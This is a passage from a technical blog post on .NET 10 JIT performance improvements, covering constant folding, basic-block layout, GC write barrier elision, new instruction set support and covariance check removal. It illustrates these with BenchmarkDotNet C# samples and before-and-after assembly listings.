Environment.ProcessorCount;</code></pre><p>the C# compiler will only be able to fold the <code>2 * 3</code>, and will emit the equivalent of:</p><pre><code>int M1(int i) =&gt; i + M2(6); int M2(int j) =&gt; j * Environment.ProcessorCount;</code></pre><p>but when compiling <code>M1</code>, the JIT can inline <code>M2</code> and treat <code>ProcessorCount</code> as a constant (on my machine it&rsquo;s 16), and produce the following assembly code for <code>M1</code>:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "i")] public partial class Tests { [Benchmark] [Arguments(42)] public int M1(int i) =&gt; i + M2(6); private int M2(int j) =&gt; j * Environment.ProcessorCount; }</code></pre><pre><code>; .NET 9 ; Tests.M1(Int32) lea eax,[rsi+60] ret ; Total bytes of code 4</code></pre><p>That&rsquo;s as if the code for <code>M1</code> had been <code>public int M1(int i) =&gt; i + 96;</code> (the displayed assembly renders hexadecimal, so the <code>60</code> is hexadecimal <code>0x60</code> and thus decimal <code>96</code>).</p><p>Or consider:</p><pre><code>string M() =&gt; GetString() ?? throw new Exception(); static string GetString() =&gt; "test";</code></pre><p>The JIT will be able to inline <code>GetString</code>, at which point it can see that the result is non-<code>null</code> and can fold away the check for the <code>null</code> constant, at which point it can also dead-code eliminate the <code>throw</code>. Constant folding is useful on its own in avoiding unnecessary work, but it also often unlocks other optimizations, like dead-code elimination and bounds-check elimination. The JIT is already quite good at finding constant folding opportunities, and gets better in .NET 10. Consider this benchmark:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "s")] public partial class Tests { [Benchmark] [Arguments("test")] public ReadOnlySpan<char> Test(string s) { s ??= ""; return s.AsSpan(); } }</char></code></pre><p>Here&rsquo;s the assembly that gets produced for .NET 9:</p><pre><code>; .NET 9 ; Tests.Test(System.String) push rbp mov rbp,rsp mov rax,75B5D6200008 test rsi,rsi cmove rsi,rax test rsi,rsi jne short M00_L01 xor eax,eax xor edx,edx M00_L00: pop rbp ret M00_L01: lea rax,[rsi+0C] mov edx,[rsi+8] jmp short M00_L00 ; Total bytes of code 41</code></pre><p>Of particular note are those two <code>test rsi,rsi</code> instructions, which are <code>null</code> checks. The assembly starts by loading a value into <code>rax</code>; that value is the address of the <code>""</code> string literal. It then uses <code>test rsi,rsi</code> to check whether the <code>s</code> parameter, which was passed into this instance method in the <code>rsi</code> register, is <code>null</code>. If it is <code>null</code>, the <code>cmove rsi,rax</code> instruction sets it to the address of the <code>""</code> literal. And then&hellip; it does <code>test rsi,rsi</code> again? That second test is the <code>null</code> check at the beginning of <code>AsSpan</code>, which looks like this:</p><pre><code>public static ReadOnlySpan<char> AsSpan(this string? text) { if (text is null) return default; return new ReadOnlySpan<char>(ref text.GetRawStringData(), text.Length); }</char></char></code></pre><p>Now with <a href="https://github.com/dotnet/runtime/pull/111985">dotnet/runtime#111985</a>, that second <code>null</code> check, along with others, can be folded, resulting in this:</p><pre><code>; .NET 10 ; Tests.Test(System.String) mov rax,7C01C4600008 test rsi,rsi cmove rsi,rax lea rax,[rsi+0C] mov edx,[rsi+8] ret ; Total bytes of code 25</code></pre><p>Similar impact comes from <a href="https://github.com/dotnet/runtime/pull/108420">dotnet/runtime#108420</a>, which is also able to fold a different class of <code>null</code> checks.</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD", "condition")] public partial class Tests { [Benchmark] [Arguments(true)] public bool Test(bool condition) { string tmp = condition ? GetString1() : GetString2(); return tmp is not null; } private static string GetString1() =&gt; "Hello"; private static string GetString2() =&gt; "World"; }</code></pre><p>In this benchmark, <em>we</em> can see that neither <code>GetString1</code> nor <code>GetString2</code> return <code>null</code>, and thus the <code>is not null</code> check shouldn&rsquo;t be necessary. The JIT in .NET 9 couldn&rsquo;t see that, but its improved .NET 10 self can.</p><pre><code>; .NET 9 ; Tests.Test(Boolean) mov rax,7407F000A018 mov rcx,7407F000A050 test sil,sil cmove rax,rcx test rax,rax setne al movzx eax,al ret ; Total bytes of code 37 ; .NET 10 ; Tests.Test(Boolean) mov eax,1 ret ; Total bytes of code 6</code></pre><p>Constant folding also applies to SIMD (Single Instruction Multiple Data), instructions that enable processing multiple pieces of data at once rather than only one element at a time. <a href="https://github.com/dotnet/runtime/pull/117099">dotnet/runtime#117099</a> and <a href="https://github.com/dotnet/runtime/pull/117572">dotnet/runtime#117572</a> both enable more SIMD comparison operations to participate in folding.</p><h3>Code Layout</h3><p>When the JIT compiler generates assembly from the IL emitted by the C# compiler, it organizes that code into &ldquo;basic blocks,&rdquo; a sequence of instructions with one entry point and one exit point, no jumps inside, no branches out except at the end. These blocks can then be moved around as a unit, and the order in which these blocks are placed in memory is referred to as &ldquo;code layout&rdquo; or &ldquo;basic block layout.&rdquo; This ordering can have a significant performance impact because modern CPUs rely heavily on an instruction cache and on branch prediction to keep things moving fast. If frequently executed (&ldquo;hot&rdquo;) blocks are close together and follow a common execution path, the CPU can execute them with fewer cache misses and fewer mispredicted jumps. If the layout is poor, where the hot code is split into pieces far apart from each other, or where rarely executed (&ldquo;cold&rdquo;) code sits in between, the CPU can spend more time jumping around and refilling caches than doing actual work. Consider a tight loop executed millions of times. A good layout keeps the loop entry, body, and backward edge (the jump back to the beginning of the body to do the next iteration) right next to each other, letting the CPU fetch them straight from the cache. In a bad layout, that loop might be interwoven with unrelated cold blocks (say, a <code>catch</code> block for a <code>try</code> in the loop), forcing the CPU to load instructions from different places and disrupting the flow. Similarly, for an <code>if</code> block, the likely path should generally be the next block so no jump is required, with the unlikely branch behind a short jump away, as that better aligns with the sensibilities of branch predictors. Code layout heuristics control how that happens, and as a result, how efficient the resulting code is able to execute.</p><p>When determining the starting layout of the blocks (before additional optimizations are done for the layout), <a href="https://github.com/dotnet/runtime/pull/108903">dotnet/runtime#108903</a> employs a &ldquo;loop-aware reverse post-order&rdquo; traversal. A reverse post-order traversal is an algorithm for visiting the nodes in a control flow graph such that each block appears after its predecessors. The &ldquo;loop aware&rdquo; part means the traversal recognizes loops as units, effectively creating a block around the whole loop, and tries to keep the whole loop together as the layout algorithm moves things around. The intent here is to start the larger layout optimizations from a more sensible place, reducing the amount of later reshuffling and situations where loop bodies get broken up.</p><p>In the extreme, layout is essentially the <a href="https://en.wikipedia.org/wiki/Travelling_salesman_problem">traveling salesman problem</a>. The JIT must decide the order of basic blocks so that control transfers follow short, predictable paths and make efficient use of instruction cache and branch prediction. Just like the salesman visiting cities with minimal total travel distance, the compiler is trying to arrange blocks so that the &ldquo;distance&rdquo; between blocks, which might be measured in bytes or instruction fetch cost or something similar, is minimized. For any meaningfully-sized set of blocks, this is prohibitively expensive to compute optimally, as the number of possible orderings grows factorially with the number of blocks. Thus, the JIT has to rely on approximations rather than attempting an exact solution. One such approximation it employs now as of <a href="https://github.com/dotnet/runtime/pull/103450">dotnet/runtime#103450</a> (and then tweaked further in <a href="https://github.com/dotnet/runtime/pull/109741">dotnet/runtime#109741</a> and <a href="https://github.com/dotnet/runtime/pull/109835">dotnet/runtime#109835</a>) is a &ldquo;3-opt,&rdquo; which really just means that rather than considering all blocks together, it looks at only three and tries to produce an optimal ordering amongst those (there are only eight possible orderings to be checked). The JIT can choose to iterate through sets of three blocks until either it doesn&rsquo;t see any more improvements or hits a self-imposed limit. Specifically when handling backward jumps, with <a href="https://github.com/dotnet/runtime/pull/110277">dotnet/runtime#110277</a>, it expands this &ldquo;3-opt&rdquo; to &ldquo;4-opt&rdquo; (four blocks).</p><p>.NET 10 also does a better job of factoring PGO data into layout. With dynamic PGO, the JIT is able to gather instrumentation data from an initial compilation and then use the results of that profiling to impact an optimized re-compilation. That data can lead to conclusions about what blocks are hot or cold, and which direction branches take, all information that&rsquo;s valuable for layout optimization. However, data can sometimes be missing from these profiles, so the JIT has a &ldquo;profile synthesis&rdquo; algorithm that makes realistic guesses for these gaps in order to fill them in (if you&rsquo;ve read or seen &ldquo;Jurassic Park,&rdquo; this is the JIT-equivalent to filling in gaps in the dinosaur DNA sequences with that from present-day frogs.) With <a href="https://github.com/dotnet/runtime/pull/111915">dotnet/runtime#111915</a>, that repairing of the profile data is now performed just before layout, so that layout has a more complete picture.</p><p>Let&rsquo;s take a concrete example of all this. Here I&rsquo;ve extracted the core function from <code>MemoryExtensions.BinarySearch</code>:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; using System.Runtime.CompilerServices; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private int[] _values = Enumerable.Range(0, 512).ToArray(); [Benchmark] public int BinarySearch() { int[] values = _values; return BinarySearch(ref values[0], values.Length, 256); } [MethodImpl(MethodImplOptions.NoInlining)] private static int BinarySearch<t>( ref T spanStart, int length, TComparable comparable) where TComparable : IComparable<t>, allows ref struct { int lo = 0; int hi = length - 1; while (lo &lt;= hi) { int i = (int)(((uint)hi + (uint)lo) &gt;&gt; 1); int c = comparable.CompareTo(Unsafe.Add(ref spanStart, i)); if (c == 0) { return i; } else if (c &gt; 0) { lo = i + 1; } else { hi = i - 1; } } return ~lo; } }</t></t></code></pre><p>And here&rsquo;s the assembly we get for .NET 9 and .NET 10, diff&rsquo;d from the former to the latter:</p><pre><code>; Tests.BinarySearch[[System.Int32, System.Private.CoreLib],[System.Int32, System.Private.CoreLib]](Int32 ByRef, Int32, Int32) push rbp mov rbp,rsp xor ecx,ecx dec esi js short M01_L07 + jmp short M01_L03 M01_L00: - lea eax,[rsi+rcx] - shr eax,1 - movsxd r8,eax - mov r8d,[rdi+r8*4] - cmp edx,r8d - jge short M01_L03 mov r9d,0FFFFFFFF M01_L01: test r9d,r9d je short M01_L06 test r9d,r9d jg short M01_L05 lea esi,[rax-1] M01_L02: cmp ecx,esi - jle short M01_L00 - jmp short M01_L07 + jg short M01_L07 M01_L03: + lea eax,[rsi+rcx] + shr eax,1 + movsxd r8,eax + mov r8d,[rdi+r8*4] cmp edx,r8d - jg short M01_L04 - xor r9d,r9d + jl short M01_L00 + cmp edx,r8d + jle short M01_L04 + mov r9d,1 jmp short M01_L01 M01_L04: - mov r9d,1 + xor r9d,r9d jmp short M01_L01 M01_L05: lea ecx,[rax+1] jmp short M01_L02 M01_L06: pop rbp ret M01_L07: mov eax,ecx not eax pop rbp ret ; Total bytes of code 83</code></pre><p>We can see that the main change here is a block that&rsquo;s moved (the bulk of <code>M01_L00</code> moving down to <code>M01_L03</code>). In .NET 9, the <code>lo &lt;= hi</code> &ldquo;stay in the loop check&rdquo; (<code>cmp ecx,esi</code>) is a backward conditional branch (<code>jle short M01_L00</code>), where every iteration of the loop except for the last jumps back to the top (<code>M01_L00</code>). In .NET 10, it instead does a forward branch to exit the loop only in the rarer case, otherwise falling through to the body of the loop in the common case, and then unconditionally branching back.</p><h3>GC Write Barriers</h3><p>The .NET garbage collector (GC) works on a generational model, organizing the managed heap according to how long objects have been alive. The newest allocations land in &ldquo;generation 0&rdquo; (gen0), objects that have survived at least one collection are promoted to &ldquo;generation 1&rdquo; (gen1), and those that have been around for longer end up in &ldquo;generation 2&rdquo; (gen2). This is based on the premise that most objects are temporary, and that once an object has been around for a while, it&rsquo;s likely to stick around for a while longer. Splitting up the heap into generations enables for quickly collecting gen0 objects by only scanning the gen0 heap for remaining references to that object. The expectation is that all, or at least the vast majority, of references to a gen0 object are also in gen0. Of course, if a reference to a gen0 object snuck into gen1 or gen2, not scanning gen1 or gen2 during a gen0 collection could be, well, bad. To avoid that case, the JIT collaborates with the GC to track references from older to younger generations. Whenever there&rsquo;s a reference write that could cross a generation, the JIT emits a call to a helper that tracks the information in a &ldquo;card table,&rdquo; and when the GC runs, it consults this table to see if it needs to scan a portion of the higher generations. That helper is referred to as a &ldquo;GC write barrier.&rdquo; Since a write barrier is potentially employed on every reference write, it must be super fast, and in fact the runtime has several different variations of write barriers so that the JIT can pick one optimized for the given situation. Of course, the fastest write barrier is one that doesn&rsquo;t need to exist at all, so as with bounds checks, the JIT also exerts energy to try to prove when write barriers aren&rsquo;t needed, eliding them when it can. And it can even more in .NET 10.</p><p><code>ref structs</code>, referred to in runtime vernacular as &ldquo;byref-like types,&rdquo; can never live on the heap, which means any reference fields in them will similarly never live on the heap. As such, if the JIT can prove that a reference write is targeting a field of a <code>ref struct</code>, it can elide the write barrier. Consider this example:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private object _object = new(); [Benchmark] public MyRefStruct Test() =&gt; new MyRefStruct() { Obj1 = _object, Obj2 = _object, Obj3 = _object }; public ref struct MyRefStruct { public object Obj1; public object Obj2; public object Obj3; } }</code></pre><p>In the .NET 9 assembly, we can see three write barriers (<code>CORINFO_HELP_CHECKED_ASSIGN_REF</code>) corresponding to the three fields in <code>MyRefStruct</code> in the benchmark:</p><pre><code>; .NET 9 ; Tests.Test() push r15 push r14 push rbx mov rbx,rsi mov r15,[rdi+8] mov rsi,r15 mov r14,r15 mov rdi,rbx call CORINFO_HELP_CHECKED_ASSIGN_REF lea rdi,[rbx+8] mov rsi,r14 call CORINFO_HELP_CHECKED_ASSIGN_REF lea rdi,[rbx+10] mov rsi,r15 call CORINFO_HELP_CHECKED_ASSIGN_REF mov rax,rbx pop rbx pop r14 pop r15 ret ; Total bytes of code 59</code></pre><p>With <a href="https://github.com/dotnet/runtime/pull/111576">dotnet/runtime#111576</a> and <a href="https://github.com/dotnet/runtime/pull/111733">dotnet/runtime#111733</a> in .NET 10, all of those write barriers are elided:</p><pre><code>; .NET 10 ; Tests.Test() mov rax,[rdi+8] mov rcx,rax mov rdx,rax mov [rsi],rcx mov [rsi+8],rdx mov [rsi+10],rax mov rax,rsi ret ; Total bytes of code 25</code></pre><p>Much more impactful, however, are <a href="https://github.com/dotnet/runtime/pull/112060">dotnet/runtime#112060</a> and <a href="https://github.com/dotnet/runtime/pull/112227">dotnet/runtime#112227</a>, which have to do with &ldquo;return buffers.&rdquo; When a .NET method is typed to return a value, the runtime has to decide how that value gets from the callee back to the caller. For small types, like integers, floating-point numbers, pointers, or object references, the answer is simple: the value can be passed back via one or more CPU registers reserved for return values, making the operation essentially free. But not all values fit neatly into registers. Larger value types, such as structs with multiple fields, require a different strategy. In these cases, the caller allocates a &ldquo;return buffer,&rdquo; a block of memory, typically in the caller&rsquo;s stack frame, and the caller passes a pointer to that buffer as a hidden argument to the method. The method then writes the return value directly into that buffer in order to provide the caller with the data. When it comes to write barriers, the challenge here is that there historically hasn&rsquo;t been a requirement that the return buffer be on the stack; it&rsquo;s technically feasible it could have been allocated on the heap, even if it rarely or never is. And since the callee doesn&rsquo;t know where the buffer lives, any object reference writes needed to be tracked with GC write barriers. We can see that with a simple benchmark:</p><pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private string _firstName = "Jane", _lastName = "Smith", _address = "123 Main St", _city = "Anytown"; [Benchmark] public Person GetPerson() =&gt; new(_firstName, _lastName, _address, _city); public record struct Person(string FirstName, string LastName, string Address, string City); }</code></pre><p>On .NET 9, each field of the returned value type is incurring a <code>CORINFO_HELP_CHECKED_ASSIGN_REF</code> write barrier:</p><pre><code>; .NET 9 ; Tests.GetPerson() push r15 push r14 push r13 push rbx mov rbx,rsi mov rsi,[rdi+8] mov r15,[rdi+10] mov r14,[rdi+18] mov r13,[rdi+20] mov rdi,rbx call CORINFO_HELP_CHECKED_ASSIGN_REF lea rdi,[rbx+8] mov rsi,r15 call CORINFO_HELP_CHECKED_ASSIGN_REF lea rdi,[rbx+10] mov rsi,r14 call CORINFO_HELP_CHECKED_ASSIGN_REF lea rdi,[rbx+18] mov rsi,r13 call CORINFO_HELP_CHECKED_ASSIGN_REF mov rax,rbx pop rbx pop r13 pop r14 pop r15 ret ; Total bytes of code 81</code></pre><p>Now in .NET 10, the calling convention has been updated to require that the return buffer live on the stack (if the caller wants the data somewhere else, it&rsquo;s responsible for subsequently doing that copy). And because the return buffer is now guaranteed to be on the stack, the JIT can elide all GC write barriers as part of returning values.</p><pre><code>; .NET 10 ; Tests.GetPerson() mov rax,[rdi+8] mov rcx,[rdi+10] mov rdx,[rdi+18] mov rdi,[rdi+20] mov [rsi],rax mov [rsi+8],rcx mov [rsi+10],rdx mov [rsi+18],rdi mov rax,rsi ret ; Total bytes of code 35</code></pre><p><a href="https://github.com/dotnet/runtime/pull/111636">dotnet/runtime#111636</a> from <a href="https://github.com/a74nh">@a74nh</a> is also interesting from a performance perspective because, as is common in optimization, it trades off one thing for another. Prior to this change, Arm64 had one universal write barrier helper for all GC modes. This change brings Arm64 in line with x64 by routing through a <code>WriteBarrierManager</code> that selects among multiple <code>JIT_WriteBarrier</code> variants based on runtime configuration. In doing so, it makes each Arm64 write barrier a bit more expensive, by adding region checks and moving to a region-aware card marking scheme, but in exchange it lets the GC do less work: fewer cards in the card table get marked, and the GC can scan more precisely. <a href="https://github.com/dotnet/runtime/pull/106191">dotnet/runtime#106191</a> also helps reduce the cost of write barriers on Arm64 by tightening the hot-path comparisons and eliminating some avoidable saves and restores.</p><h3>Instruction Sets</h3><p>.NET continues to see meaningful optimizations and improvements across all supported architectures, along with various architecture-specific improvements. Here are a handful of examples.</p><h4>Arm SVE</h4><p>APIs for Arm SVE were introduced in .NET 9. As noted in the <a href="https://devblogs.microsoft.com/dotnet/performance-improvements-in-net-9/#arm-sve">Arm SVE</a> section of last year&rsquo;s post, enabling SVE is a multi-year effort, and in .NET 10, support is still considered experimental. However, the support has continued to be improved and extended, with PRs like <a href="https://github.com/dotnet/runtime/pull/115775">dotnet/runtime#115775</a> from <a href="https://github.com/snickolls-arm">@snickolls-arm</a> adding <code>BitwiseSelect</code> methods, <a href="https://github.com/dotnet/runtime/pull/117711">dotnet/runtime#117711</a> from <a href="https://github.com/jacob-crawley">@jacob-crawley</a> adding <code>MaxPairwise</code> and <code>MinPairwise</code> methods, and <a href="https://github.com/dotnet/runtime/pull/117051">dotnet/runtime#117051</a> from <a href="https://github.com/jonathandavies-arm">@jonathandavies-arm</a> adding <code>VectorTableLookup</code> methods.</p><h4>Arm64</h4><p><a href="https://github.com/dotnet/runtime/pull/111893">dotnet/runtime#111893</a> from <a href="https://github.com/jonathandavies-arm">@jonathandavies-arm</a>, <a href="https://github.com/dotnet/runtime/pull/111904">dotnet/runtime#111904</a> from <a href="https://github.com/jonathandavies-arm">@jonathandavies-arm</a>, <a href="https://github.com/dotnet/runtime/pull/111452">dotnet/runtime#111452</a> from <a href="https://github.com/jonathandavies-arm">@jonathandavies-arm</a>, <a href="https://github.com/dotnet/runtime/pull/112235">dotnet/runtime#112235</a> from <a href="https://github.com/jonathandavies-arm">@jonathandavies-arm</a>, and <a href="https://github.com/dotnet/runtime/pull/111797">dotnet/runtime#111797</a> from <a href="https://github.com/snickolls-arm">@snickolls-arm</a> all improved .NET&rsquo;s support for utilizing Arm64&rsquo;s multi-operation compound instructions. For example, when implementing a compare and branch, rather than emitting a <code>cmp</code> against 0 followed by <code>beq</code> instruction, the JIT may now emit a <code>cbz</code> (&ldquo;Compare and Branch on Zero&rdquo;) instruction.</p><h4>APX</h4><p>Intel&rsquo;s Advanced Performance Extensions (APX) was announced in 2023 as an extension of the x86/x64 instruction set. It expands the number of general-purpose registers from 16 to 32 and adds new instructions such as conditional operations designed to reduce memory traffic, improve performance, and lower power consumption. <a href="https://github.com/dotnet/runtime/pull/106557">dotnet/runtime#106557</a> from <a href="https://github.com/Ruihan-Yin">@Ruihan-Yin</a>, <a href="https://github.com/dotnet/runtime/pull/108796">dotnet/runtime#108796</a> from <a href="https://github.com/Ruihan-Yin">@Ruihan-Yin</a>, and <a href="https://github.com/dotnet/runtime/pull/113237">dotnet/runtime#113237</a> from <a href="https://github.com/Ruihan-Yin">@Ruihan-Yin</a> essentially teach the JIT how to speak the new dialect of assembly code (the REX and expanded EVEX encodings), and <a href="https://github.com/dotnet/runtime/pull/108799">dotnet/runtime#108799</a> from <a href="https://github.com/Ruihan-Yin">@Ruihan-Yin</a> updates the JIT to be able to use the expanded set of registers. The most impactful new instructions in APX are around conditional compares (<code>ccmp</code>), a concept the JIT already supports from targeting other instruction sets, and <a href="https://github.com/dotnet/runtime/pull/111072">dotnet/runtime#111072</a> from <a href="https://github.com/anthonycanino">@anthonycanino</a>, <a href="https://github.com/dotnet/runtime/pull/112153">dotnet/runtime#112153</a> from <a href="https://github.com/anthonycanino">@anthonycanino</a>, and <a href="https://github.com/dotnet/runtime/pull/116445">dotnet/runtime#116445</a> from <a href="https://github.com/khushal1996">@khushal1996</a> all teach the JIT how to make good use of these new instructions with APX.</p><h4>AVX512</h4><p>.NET 8 added broad support for AVX512, and .NET 9 significantly improved its handling and adoption throughout the core libraries. .NET 10 includes a plethora of additional related optimizations:</p><ul> <li><a href="https://github.com/dotnet/runtime/pull/109258">dotnet/runtime#109258</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> and <a href="https://github.com/dotnet/runtime/pull/109267">dotnet/runtime#109267</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> expand the number of places the JIT is able to use EVEX embedded broadcasts, a feature that lets vector instructions read a single scalar element from memory and implicitly replicate it to all the lanes of the vector, without needing a separate broadcast or shuffle operation.</li> <li><a href="https://github.com/dotnet/runtime/pull/108824">dotnet/runtime#108824</a> removes a redundant sign extension from broadcasts.</li> <li><a href="https://github.com/dotnet/runtime/pull/116117">dotnet/runtime#116117</a> from <a href="https://github.com/alexcovington">@alexcovington</a> improves the code generated for <code>Vector.Max</code> and <code>Vector.Min</code> when AVX512 is supported.</li> <li><a href="https://github.com/dotnet/runtime/pull/109474">dotnet/runtime#109474</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> improves &ldquo;containment&rdquo; (where an instruction can be eliminated by having its behaviors fully encapsulated by another instruction) for AVX512 widening intrinsics (similar containment-related improvements were made in <a href="https://github.com/dotnet/runtime/pull/110736">dotnet/runtime#110736</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> and <a href="https://github.com/dotnet/runtime/pull/111778">dotnet/runtime#111778</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a>).</li> <li><a href="https://github.com/dotnet/runtime/pull/111853">dotnet/runtime#111853</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> improves <code>Vector128/256/512.Dot</code> to be better accelerated with AVX512.</li> <li><a href="https://github.com/dotnet/runtime/pull/110195">dotnet/runtime#110195</a>, <a href="https://github.com/dotnet/runtime/pull/110307">dotnet/runtime#110307</a>, and <a href="https://github.com/dotnet/runtime/pull/117118">dotnet/runtime#117118</a> all improve how vector masks are handled. In AVX512, masks are special registers that can be included as part of various instructions to control which subset of vector elements should be utilized (each bit in a mask corresponds to one element in the vector). This enables operating on only part of a vector without needing extra branching or shuffling.</li> <li><a href="https://github.com/dotnet/runtime/pull/115981">dotnet/runtime#115981</a> improves zeroing (where the JIT emits instructions to zero out memory, often as part of initializing a stack frame) on AVX512. After zeroing as much as it can with 64-byte instructions, it was falling back to using 16-byte instructions, when it could have used 32-byte instructions.</li> <li><a href="https://github.com/dotnet/runtime/pull/110662">dotnet/runtime#110662</a> improves the code generated for <code>ExtractMostSignificantBits</code> (which is used by many of the searching algorithms in the core libraries) when working with <code>short</code> and <code>ushort</code> (and <code>char</code>, as most of those core library implementations reinterpret cast <code>char</code> as one of the others) by using EVEX mask support.</li> <li><a href="https://github.com/dotnet/runtime/pull/113864">dotnet/runtime#113864</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> improves the code generated for <code>ConditionalSelect</code> when not used with mask registers.</li> </ul> <h4>AVX10.2</h4><p>.NET 9 added support and intrinsics for the AVX10.1 instruction set. With <a href="https://github.com/dotnet/runtime/pull/111209">dotnet/runtime#111209</a> from <a href="https://github.com/khushal1996">@khushal1996</a>, .NET 10 adds support and intrinsics for the AVX10.2 instruction set. <a href="https://github.com/dotnet/runtime/pull/112535">dotnet/runtime#112535</a> from <a href="https://github.com/khushal1996">@khushal1996</a> optimizes floating-point min/max operations with AVX10.2 instructions, while <a href="https://github.com/dotnet/runtime/pull/111775">dotnet/runtime#111775</a> from <a href="https://github.com/khushal1996">@khushal1996</a> enables floating-point conversions to utilize AVX10.2.</p><h4>GFNI</h4><p><a href="https://github.com/dotnet/runtime/pull/109537">dotnet/runtime#109537</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> adds intrinsics for the GFNI (Galois Field New Instructions) instruction set, which can be used for accelerating operations over Galois fields GF(2^8). These are common in cryptography, error correction, and data encoding.</p><h4>VPCLMULQDQ</h4><p><code>VPCLMULQDQ</code> is an x86 instruction set extension that adds vector support to the older <code>PCLMULQDQ</code> instruction, which performs carry-less multiplication over 64-bit integers. <a href="https://github.com/dotnet/runtime/pull/109137">dotnet/runtime#109137</a> from <a href="https://github.com/saucecontrol">@saucecontrol</a> adds new intrinsic APIs for <code>VPCLMULQDQ</code>.</p><h3>Miscellaneous</h3><p>Many more PRs than the ones I&rsquo;ve already called out have gone into the JIT this release. Here are a few more:</p><ul> <li><strong>Eliminating some covariance checks</strong>. Writing into arrays of reference types can require &ldquo;covariance checks.&rdquo; Imagine you have a class <code>Base</code> and two derived types <code>Derived1 : Base</code> and <code>Derived2 : Base</code>. Since arrays in .NET are covariant, I can have a <code>Derived1[]</code> and cast it successfully to a <code>Base[]</code>, but under the covers that&rsquo;s still a <code>Derived1[]</code>. That means, for example, that any attempt to store a <code>Derived2</code> into that array should fail at runtime, even if it compiles. To achieve that, the JIT needs to insert such covariance checks when writing into arrays, but just like with bounds checking and write barriers, the JIT can elide those checks when it can prove statically that they&rsquo;re not necessary. Such an example is with sealed types. If the JIT sees an array of type <code>T[]</code> and <code>T</code> is known to be sealed, <code>T[]</code> must exactly be a <code>T[]</code> and not some <code>DerivedT[]</code>, because there can&rsquo;t be a <code>DerivedT</code>. So with a benchmark like this:<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); [DisassemblyDiagnoser] [HideColumns("Job", "Error", "StdDev", "Median", "RatioSD")] public partial class Tests { private List<string> _list = new() { "hello" }; [Benchmark] public void Set() =&gt; _list[0] = "world"; }</string></code></pre><p>as long as the JIT can see that the array underlying the <code>List<string></string></code> is a <code>string[]</code> (<code>string</code> is sealed), it shouldn&rsquo;t need a covariance check. In .NET 9, we get this:</p><pre><code>; .NET 9 ; Tests.Set() push rbx mov rbx,[rdi+8] cmp dword ptr [rbx+10],0 je short M00_L00 mov rdi,[rbx+8] xor esi,esi mov rdx,78914920A038 call System.Runtime.CompilerServices.CastHelpers.StelemRef(System.Object[], IntPtr, System.Object) inc dword ptr [rbx+14] pop rbx ret M00_L00: call qword ptr [78D1F80558A8] int 3 ; Total bytes of code 44</code></pre><p>Note that <code>CastHelpers.StelemRef</code> call&hellip; that&rsquo;s the helper that performs the write with the covariance check. But now in .NET 10, thanks to <a href="https://github.com/dotnet/runtime/pull/107116">dotnet/runtime#107116</a> (which teaches the JIT how to resolve the exact type for the field of the closed generic), we get this:</p><pre><code>; .NET 10 ; Tests.Set() push rbp mov rbp,rsp mov rax,[rdi+8] cmp dword ptr [rax+10],0 je short M00_L00 mov rcx,[rax+8] mov edx,[rcx+8] test rdx,rdx je short M00_L01 mov rdx,75E2B9009A40 mov [rcx+10],rdx inc dword ptr [rax+14] pop rbp ret M00_L00: call qword ptr [762368116760] int 3 M00_L01: call CORINFO_HELP_RNGCHKFAIL int 3 ; Total bytes of code 58</code></pre><p>No covariance check, thank you very much.</p></li> <li><strong>More strength reduction</strong>. &ldquo;Strength reduction&rdquo; is a classic compiler optimization that replaces more expensive operations, like multiplications, with cheaper ones, like additions. In .NET 9, this was used to transform indexed loops that used multiplied offsets (e.g. <code>index * elementSize</code>) into loops that simply incremented a pointer-like offset (e.g. <code>offset += elementSize</code>), cutting down on arithmetic overhead and improving performance. In .NET 10, strength reduction has been extended, in particular with <a href="https://github.com/dotnet/runtime/pull/110222">dotnet/runtime#110222</a>. This enables the JIT to detect multiple loop induction variables with different step sizes and strength-reduce them by leveraging their greatest common divisor (GCD). Essentially, it creates a single primary induction variable based on the GCD of the varying step sizes, and then recovers each original induction variable by appropriately scaling. Consider this example:<pre><code>// dotnet run -c Release -f net9.0 --filter "*" --runtimes net9.0 net10.0 using BenchmarkDotNet.Attributes; using BenchmarkDotNet.Running; BenchmarkSwitcher.FromAssembly(typeof(Tests).Assembly).Run(args); 